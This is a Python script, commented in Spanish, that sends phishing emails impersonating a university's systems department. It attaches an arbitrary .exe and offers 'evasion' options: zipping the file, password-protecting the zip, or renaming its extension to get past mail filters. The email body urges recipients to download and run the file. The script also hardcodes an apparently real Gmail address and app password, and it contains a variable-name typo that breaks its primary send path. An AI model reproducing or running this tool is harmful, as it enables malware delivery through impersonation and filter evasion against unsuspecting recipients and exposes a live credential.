#!/usr/bin/env python3
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import zipfile
import time

def comprimir_archivo(archivo_original, usar_password=False):
    """Comprimir el archivo EXE en ZIP"""
    nombre_zip = archivo_original.replace('.exe', '_update.zip')
    
    with zipfile.ZipFile(nombre_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        if usar_password:
            # ZIP con contraseña (password: 'utn2025')
            zipf.setpassword(b'utn2025')
            zipf.write(archivo_original, os.path.basename(archivo_original))
        else:
            zipf.write(archivo_original, os.path.basename(archivo_original))
    
    return nombre_zip

def cambiar_extension_archivo(archivo_original, nueva_extension):
    """Cambiar la extension del archivo temporalmente"""
    nuevo_nombre = archivo_original.replace('.exe', nueva_extension)
    os.rename(archivo_original, nuevo_nombre)
    return nuevo_nombre

def restaurar_extension_archivo(archivo_renombrado, extension_original):
    """Restaurar la extension original del archivo"""
    nombre_original = archivo_renombrado.replace(extension_original, '.exe')
    os.rename(archivo_renombrado, nombre_original)
    return nombre_original

def seleccionar_servidor_email():
    """Menu para seleccionar el servidor de email"""
    print("\n--- SELECCION DE SERVIDOR DE EMAIL ---")
    print("1. Gmail (smtp.gmail.com:587)")
    print("2. Outlook (smtp.office365.com:587)")
    print("3. Yahoo (smtp.mail.yahoo.com:587)")
    print("4. Hotmail (smtp.live.com:587)")
    
    opcion = input("Seleccione servidor (1-4): ").strip()
    
    servidores = {
        '1': ('smtp.gmail.com', 587),
        '2': ('smtp.office365.com', 587),
        '3': ('smtp.mail.yahoo.com', 587),
        '4': ('smtp.live.com', 587)
    }
    
    return servidores.get(opcion, ('smtp.gmail.com', 587))

def send_utn_spoofed_email():
    # CONFIGURACION DE CUENTA REAL
    gmail_user = "piedrozadaniel@gmail.com"
    gmail_password = "xuawyofxhwudgrdn"
    
    # CONFIGURACION DE SUPLANTACION MEJORADA
    display_name = "Departamento de Sistemas UTN"
    spoofed_email = "sistemas@utn.edu.mx"
    
    # SOLICITAR CORREO DESTINO
    print("\n--- CONFIGURACION DE DESTINO ---")
    target_email = input("Ingrese el correo destino: ").strip()
    
    if not target_email:
        print("Error: Debe ingresar un correo destino")
        return
    
    # MENU DE SELECCION DE ARCHIVO
    print("\n--- SELECCION DE ARCHIVO ---")
    print("Opciones:")
    print("1. Buscar y seleccionar archivo en el sistema")
    print("2. Usar ruta manualmente")
    
    archivo_opcion = input("Seleccione opcion (1-2): ").strip()
    
    attachment_path = ""
    archivo_original = ""
    
    if archivo_opcion == "1":
        # Buscar archivos en el directorio actual y subdirectorios
        found_files = []
        for root, dirs, files in os.walk("."):
            for file in files:
                if file.lower().endswith(('.exe', '.zip', '.rar', '.7z', '.dat', '.bin')):
                    full_path = os.path.join(root, file)
                    found_files.append(full_path)
        
        if found_files:
            print("\nArchivos encontrados:")
            for i, file_path in enumerate(found_files, 1):
                file_size = os.path.getsize(file_path)
                print(f"{i}. {file_path} ({file_size} bytes)")
            
            try:
                seleccion = int(input(f"\nSeleccione un archivo (1-{len(found_files)}): "))
                if 1 <= seleccion <= len(found_files):
                    attachment_path = found_files[seleccion-1]
                    archivo_original = attachment_path
                    print(f"Archivo seleccionado: {attachment_path}")
                else:
                    print("Seleccion invalida")
                    return
            except ValueError:
                print("Por favor ingrese un numero valido")
                return
        else:
            print("No se encontraron archivos en el directorio actual")
            print("Usando opcion de ruta manual...")
            archivo_opcion = "2"
    
    if archivo_opcion == "2" or not attachment_path:
        attachment_path = input("Ingrese la ruta completa del archivo: ").strip()
        attachment_path = attachment_path.strip('"\'')
        archivo_original = attachment_path
    
    # Verificar que el archivo existe
    if not os.path.exists(attachment_path):
        print(f"Error: El archivo {attachment_path} no existe")
        return
    
    print(f"Archivo confirmado: {attachment_path}")
    print(f"Tamaño del archivo: {os.path.getsize(attachment_path)} bytes")
    
    # MENU DE OPCIONES DE SEGURIDAD
    print("\n--- OPCIONES DE EVASION ---")
    print("1. Enviar archivo directamente (riesgo de bloqueo)")
    print("2. Comprimir en ZIP sin contraseña")
    print("3. Comprimir en ZIP con contraseña")
    print("4. Cambiar extension a .dat")
    print("5. Cambiar extension a .bin")
    print("6. Cambiar extension a .tmp")
    
    seguridad_opcion = input("Seleccione metodo (1-6): ").strip()
    
    archivo_temporal = None
    usar_password = False
    
    if seguridad_opcion == "2":
        # Comprimir sin contraseña
        print("Comprimiendo archivo en ZIP...")
        attachment_path = comprimir_archivo(archivo_original, False)
        archivo_temporal = attachment_path
        print(f"Archivo comprimido: {attachment_path}")
        
    elif seguridad_opcion == "3":
        # Comprimir con contraseña
        print("Comprimiendo archivo en ZIP con contraseña...")
        attachment_path = comprimir_archivo(archivo_original, True)
        archivo_temporal = attachment_path
        usar_password = True
        print(f"Archivo comprimido: {attachment_path}")
        print("Contraseña del ZIP: utn2025")
        
    elif seguridad_opcion == "4":
        # Cambiar extension a .dat
        print("Cambiando extension a .dat...")
        attachment_path = cambiar_extension_archivo(archivo_original, '.dat')
        archivo_temporal = attachment_path
        print(f"Archivo renombrado: {attachment_path}")
        
    elif seguridad_opcion == "5":
        # Cambiar extension a .bin
        print("Cambiando extension a .bin...")
        attachment_path = cambiar_extension_archivo(archivo_original, '.bin')
        archivo_temporal = attachment_path
        print(f"Archivo renombrado: {attachment_path}")
        
    elif seguridad_opcion == "6":
        # Cambiar extension a .tmp
        print("Cambiando extension a .tmp...")
        attachment_path = cambiar_extension_archivo(archivo_original, '.tmp')
        archivo_temporal = attachment_path
        print(f"Archivo renombrado: {attachment_path}")
    
    # SELECCION DE SERVIDOR
    servidor, puerto = seleccionar_servidor_email()
    print(f"Servidor seleccionado: {servidor}:{puerto}")
    
    # CONTENIDO HTML MEJORADO
    nombre_archivo = os.path.basename(attachment_path)
    
    if usar_password:
        instrucciones_extra = f"""
        <div style="background: #fff3cd; padding: 15px; border-radius: 8px; margin: 15px 0;">
            <h4 style="color: #856404;">INFORMACION IMPORTANTE:</h4>
            <p>El archivo está protegido con contraseña para mayor seguridad.</p>
            <p><strong>Contraseña: utn2025</strong></p>
        </div>
        """
    else:
        instrucciones_extra = ""
    
    html_body = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <style>
            body {{
                font-family: Arial, sans-serif;
                line-height: 1.6;
                color: #333;
                max-width: 600px;
                margin: 0 auto;
                padding: 20px;
            }}
            .header {{
                background: #0056a6;
                color: white;
                padding: 20px;
                text-align: center;
                border-radius: 8px 8px 0 0;
            }}
            .content {{
                background: white;
                padding: 25px;
                border: 1px solid #ddd;
                border-radius: 0 0 8px 8px;
            }}
            .file-info {{
                background: #e8f4fd;
                padding: 15px;
                border-radius: 6px;
                margin: 15px 0;
            }}
            .instructions {{
                background: #f8f9fa;
                padding: 15px;
                border-radius: 6px;
                margin: 15px 0;
            }}
            .footer {{
                text-align: center;
                margin-top: 20px;
                padding: 15px;
                background: #f5f5f5;
                font-size: 12px;
                color: #666;
                border-radius: 6px;
            }}
        </style>
    </head>
    <body>
        <div class="header">
            <h2>UNIVERSIDAD TECNOLÓGICA NACIONAL</h2>
            <p>Departamento de Sistemas Informáticos</p>
        </div>
        
        <div class="content">
            <h3>Material de Soporte Técnico</h3>
            
            <p>Estimado usuario,</p>
            
            <p>Se adjunta el material solicitado para el mantenimiento del sistema académico.</p>
            
            <div class="file-info">
                <h4>Archivo Adjunto:</h4>
                <p><strong>Nombre:</strong> {nombre_archivo}</p>
                <p><strong>Tamaño:</strong> {os.path.getsize(attachment_path)} bytes</p>
                <p><strong>Servidor:</strong> {servidor}</p>
            </div>
            
            {instrucciones_extra}
            
            <div class="instructions">
                <h4>Instrucciones de Uso:</h4>
                <ol>
                    <li>Descargue el archivo adjunto</li>
                    <li>Guarde en una ubicación segura</li>
                    <li>Para archivos ZIP: extraer antes de usar</li>
                    <li>Ejecute según las indicaciones del técnico</li>
                </ol>
            </div>
            
            <p>Para cualquier consulta técnica, contacte al departamento de sistemas.</p>
            
            <p>Atentamente,<br>
            <strong>Departamento de Sistemas</strong><br>
            Universidad Tecnológica Nacional</p>
        </div>
        
        <div class="footer">
            <p>Este es un mensaje automático. No responder a este correo.<br>
            UTN © 2025 - Todos los derechos reservados.</p>
        </div>
    </body>
    </html>
    """
    
    # CONSTRUCCION DEL EMAIL
    msg = MIMEMultipart()
    
    # Configuracion menos sospechosa
    msg['From'] = f'"{display_name}" <{gmail_user}>'
    msg['To'] = target_email
    msg['Subject'] = f"Material de Soporte - {nombre_archivo}"
    msg['Reply-To'] = spoofed_email
    
    # Adjuntar contenido HTML
    msg.attach(MIMEText(html_body, 'html'))
    
    try:
        # Adjuntar archivo
        with open(attachment_path, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        
        encoders.encode_base64(part)
        part.add_header(
            'Content-Disposition',
            f'attachment; filename="{nombre_archivo}"',
        )
        msg.attach(part)
        print(f"Archivo adjuntado: {attachment_path}")
        
    except Exception as e:
        print(f"Error al adjuntar archivo: {e}")
        # Limpiar archivos temporales
        if archivo_temporal and os.path.exists(archivo_temporal):
            if seguridad_opcion in ['4','5','6']:
                restaurar_extension_archivo(archivo_temporal, os.path.splitext(archivo_temporal)[1])
            else:
                os.remove(archivo_temporal)
        return

    # ENVIO CON MULTIPLES SERVIDORES
    try:
        print("\nINICIANDO ENVIO DE CORREO...")
        print(f"Usando servidor: {serverver}:{puerto}")
        print("Espere por favor...")
        
        # Conexion al servidor seleccionado
        server = smtplib.SMTP(servidor, puerto)
        server.starttls()
        
        print("Autenticando...")
        server.login(gmail_user, gmail_password)
        
        # Pequeña pausa antes del envio
        time.sleep(2)
        
        print("Enviando correo...")
        server.sendmail(gmail_user, target_email, msg.as_string())
        server.quit()
            
        print("ENVIO EXITOSO!")
        print("=" * 55)
        print(f"Servidor usado: {servidor}")
        print(f"Destino: {target_email}")
        print(f"Archivo: {nombre_archivo}")
        print(f"Tamaño: {os.path.getsize(attachment_path)} bytes")
        if usar_password:
            print("Contraseña ZIP: utn2025")
        if seguridad_opcion in ['4','5','6']:
            print(f"Archivo original: {archivo_original}")
        
    except Exception as e:
        print(f"ERROR con {servidor}: {e}")
        print("Intentando con servidor alternativo...")
        
        # Intentar con Gmail como respaldo
        try:
            print("Probando con Gmail...")
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(gmail_user, gmail_password)
            server.sendmail(gmail_user, target_email, msg.as_string())
            server.quit()
            print("ENVIO EXITOSO con Gmail!")
        except Exception as e2:
            print(f"ERROR también con Gmail: {e2}")
    
    finally:
        # LIMPIAR ARCHIVOS TEMPORALES
        if archivo_temporal and os.path.exists(archivo_temporal):
            if seguridad_opcion in ['4','5','6']:
                # Restaurar extension original
                restaurar_extension_archivo(archivo_temporal, os.path.splitext(archivo_temporal)[1])
                print("Extension restaurada a .exe")
            else:
                # Eliminar ZIP temporal
                os.remove(archivo_temporal)
                print("Archivo temporal ZIP eliminado")

def buscar_archivos():
    """Buscar archivos en el sistema"""
    print("\n--- BUSQUEDA DE ARCHIVOS ---")
    found_files = []
    extensions = ['.exe', '.zip', '.rar', '.7z', '.dat', '.bin', '.tmp']
    
    for root, dirs, files in os.walk("."):
        for file in files:
            if any(file.lower().endswith(ext) for ext in extensions):
                full_path = os.path.join(root, file)
                found_files.append(full_path)
    
    if found_files:
        print(f"\nArchivos encontrados ({len(found_files)}):")
        for i, file_path in enumerate(found_files, 1):
            file_size = os.path.getsize(file_path)
            print(f"{i}. {file_path} ({file_size} bytes)")
    else:
        print("No se encontraron archivos compatibles")
    
    return found_files

def mostrar_instrucciones():
    print("\n--- INSTRUCCIONES DE USO ---")
    print("METODOS DE EVASION DISPONIBLES:")
    print("1. ZIP sin contraseña - Evita deteccion basica")
    print("2. ZIP con contraseña - Mayor seguridad")
    print("3. Cambiar extension - Engaña filtros por extension")
    print("")
    print("SERVIDORES DISPONIBLES:")
    print("- Gmail: Filtros estrictos")
    print("- Outlook: Filtros moderados") 
    print("- Yahoo: Filtros variables")
    print("- Hotmail: Filtros menos estrictos")
    print("")
    print("RECOMENDACION: Probar diferentes combinaciones")

def menu_principal():
    while True:
        print("\n" + "="*60)
        print("SISTEMA DE DISTRIBUCION - UTN (VERSION EVASION)")
        print("="*60)
        print("1. Enviar archivo con opciones de evasion")
        print("2. Buscar archivos disponibles")
        print("3. Ver instrucciones y metodos")
        print("4. Salir")
        print("-"*60)
        
        opcion = input("Seleccione una opcion (1-4): ")
        
        if opcion == "1":
            print("\nIniciando sistema de envio con evasion...")
            send_utn_spoofed_email()
            input("\nPresione Enter para continuar...")
            
        elif opcion == "2":
            buscar_archivos()
            input("\nPresione Enter para continuar...")
                
        elif opcion == "3":
            mostrar_instrucciones()
            input("\nPresione Enter para continuar...")
            
        elif opcion == "4":
            print("\nSaliendo del sistema...")
            break
            
        else:
            print("\nOpcion no valida.")

if __name__ == "__main__":
    print("SISTEMA DE DISTRIBUCION UTN - CON TECNICAS DE EVASION")
    print("Version 6.0 - Multi-servidor y multi-metodo")
    menu_principal()
